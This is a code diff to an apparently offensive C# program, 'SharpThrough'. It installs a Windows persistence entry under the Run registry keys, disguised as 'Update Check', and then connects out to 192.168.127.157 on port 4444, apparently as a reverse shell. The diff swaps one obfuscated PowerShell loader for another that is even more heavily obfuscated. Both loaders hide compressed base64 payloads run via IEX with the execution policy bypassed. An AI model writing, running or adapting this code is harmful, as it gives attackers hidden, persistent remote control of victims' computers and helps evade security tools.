@@ -17,10 +17,16 @@ namespace SharpThrough
 
         public static void Main()
         {
-            RegistryKey first_key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
-            RegistryKey second_key = Registry.LocalMachine.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
-            modifyReg(first_key);
-            modifyReg(second_key);
+            try{
+                RegistryKey first_key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
+                 modifyReg(first_key);
+            }
+            catch (Exception ex){{}}
+            try{
+                RegistryKey second_key = Registry.LocalMachine.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
+                modifyReg(second_key);
+             }
+            catch (Exception ex){{}}
             string ip = "192.168.127.157";
             int port = 4444;
             using (TcpClient client = new TcpClient(ip, port))
@@ -90,7 +96,7 @@ namespace SharpThrough
         private static void modifyReg(RegistryKey key){
             if (key != null){
             try{
-                var launch = "cMd.eXE /c   pOweRSHeLL  -noNIntERa -WInDows  1 -NOpROf -NoLO -ExECutiOnPOLIc BypasS -comMAND   \" .( $VERBOsepREfeREnCe.tOstriNG()[1,3]+'X'-JOin'')( NEW-oBJeCT SYStEm.io.sTReAmrEADer((NEW-oBJeCT sYStem.iO.cOmPrEsSion.DEFlATESTrEAM( [IO.memoRyStREaM][CONVErT]::fROmBaSE64STrINg('zVhNb9NAED3nX8yhYFtqIqpWHFpxqFAplkJASU5EUVVVCBogQW3FJfS/45Biz8d7a6flQNWm693ZnTdv3swqznrVj2z+Nh/bYU8/bgeNhTNojKRe2z6JM2vsjYG1QnPb6b+P4pFGUxvMTrCbM5o1iFY0pgBRD3dB1/g1zFvs0gtJ0bEYdEIOiPFGftS0pSDGL2C7zr+AUeCDI6mtVDhMMkhXMfnuRGpHXdePlAxArzu3g+ptXEh4QQT14L9XgwDnoBSYDWDDe3504h31tA3U5iAjKFNEWm05EOXC8+4yLP5QEBbUcwewUfkIbIiBlyVooLuLwkWCN1DdP6IpRH1DBkAZMPU8LVh3AnJiTkjlC3bptupOqFUv8+x4RYEJq8iobTuj6yCc1TVbyA3ORYp7CU9db7aeCiLUBIrXF1bjjAsvJT26UefXA0Ed2bogWxP+QnJieYJsS2MonnjSnRBwSQENwGmJiRkSSgQcEXkgYoxV54sDckYtYCiaDXe8vpGMF72R6kYLGOFvSaPnWfSudMl3ymnw174tMojlpchurQ/cfnlbgJyT00IOYvyg7hRwWrK4hKiQ0J1sAbjANJtpT9rKLtObCwoPOYleAt+dYvbbvIV+NhedTw+5gyXwFYgiDdswEnwAbZJocQXDPgYBhSNQoflqcgdj4lklsT1YbLzuAyMes4QxW/NySF0U0U+NkpUYBBz2eTepoFkmnAISEYAaxQkAM6hvEXTi1206WioVNGZfNclMJeUce5aNIArDyYSFaYwTkrKBBOTWJmonRoQAYnW1FCzz3qILO6VNkq8o6XUBxEK+chFG05ca6TyOS4tTTSQ6ET7S334xEl9bjZ2TRtSNsAUDqIbAuCR5DfdbsAM6T2cqJT0D0+PAzwCm1tQj8KbfUBmNgdeCCOkOb6fIlwWqL8sV6kfpmeSBT+VK7QH+sJgNU2qnxJFdtQA61AScdb1ip7px+0i4rN/12nf7SXxvdJSNsVSz/0ROhHomKFQkIOGY7SRbBg9nPu62pU2I7DVrVozZL3m23rv6efbm6yvZu5D+1eTDsJxKJtVvtSbr6n92YlaqhWp+72Iw/DQ6n76V/sG93MuJPM8ln03ubsrR+TzLBsvV+N3p8PrjWTE7PNw/Otg/ejnvL96Xyywr/hiOy9Hn+fHxYnU9yiXL9vN8C2T2YjB4GD646B8Uc+kvVuWysisG03H5/XZ6Op7mW5zFYPLjWznNN9CKDep1dX45uptXEfUvb2X2+svlzbyoQBZFcf8b') , [iO.cOMPRessioN.CoMprESsIONMOdE]::DEcoMPResS ) ) , [TEXt.ENCoDing]::asciI) ).reAdTOEnd()\"";
+                var launch = "cMD.eXe  /C   \"set  GyM=  ((' ('+'new-ObJECt'+' '+'sy'+'St'+'em.'+'iO.CO'+'m'+'P'+'rESs'+'i'+'on.DeFlAtestrEA'+'m( '+'[I'+'O.'+'m'+'EMoRy'+'STR'+'EAM][sys'+'tem'+'.'+'co'+'NVERt]::fr'+'om'+'ba'+'sE64St'+'rinG( JxT'+'2'+'PY5r'+'CsIw'+'EISv'+'su'+'R'+'PL'+'Gia'+'pN'+'rXP'+'T'+'yA2v'+'q'+'i'+'a'+'G'+'m'+'rf'+'5'+'a9'+'u'+'7'+'NBGshkl'+'gn'+'fL'+'BE'+'5og'+'3hG'+'A7C'+'Udi'+'L2V3tVES7'+'tV'+'MPuc1'+'fizzTbzb'+'/'+'rB'+'7DbP8W/qVBGg0fhCv'+'hRm'+'FcC5fCR'+'WLvBSWG'+'wI'+'8O5GGA5'+'M'+'cR6s'+'Kh'+'am'+'v'+'vPXx'+'3Wnr'+'XaZ'+'SCW'+'OF5tPdlGVu4'+'UNYa5aFZy9'+'E'+'Y'+'lay'+'7'+'K/zp'+'uoQ+4'+'86X6Y3Nsh8=J'+'x'+'T2) '+',[i'+'o.c'+'OM'+'p'+'R'+'e'+'SSI'+'On'+'.co'+'mPRE'+'ssI'+'onMOdE]'+'::D'+'ec'+'OM'+'pREss'+' )'+'y'+'4B% { new-ObJ'+'E'+'Ct IO.sTR'+'E'+'AmR'+'e'+'AdeR('+'t'+'sy_,[SysT'+'em.tEXt.eN'+'c'+'ODinG]::A'+'scII)}y'+'4B'+'%{ tsy_.reaDTo'+'end'+'()})'+' '+'y4B'+' ^&'+' '+'( tsy'+'e'+'n'+'V'+':cOmSPEc'+'[4,15,25]-'+'jO'+'inJx'+'T2J'+'xT'+'2)') -crEPLACE ([cHAr]74+[cHAr]120+[cHAr]84+[cHAr]50),[cHAr]39  -replAce  'tsy',[cHAr]36-replAce([cHAr]121+[cHAr]52+[cHAr]66),[cHAr]124) ^| ^&( $EnV:cOmspEC[4,26,25]-Join'')  && Set   tJg=EchO  ieX (gCI ENV:Gym).vALUe ^|  c:\\WInDows\\SYswOw64\\WInDowspoWeRsheLL\v1.0\\pOweRSHell.exE -wi 1 -noPrOfIL  -exECUT  byPaSS  -coMM     ${EXecUtiOnconTEXT}.INvOKEcoMMAND.inVOKeScRipT(  $input )  && cMD.eXe  /C %TjG%\"";
                 key.SetValue("Update Check", launch);
                 key.Close();
             }
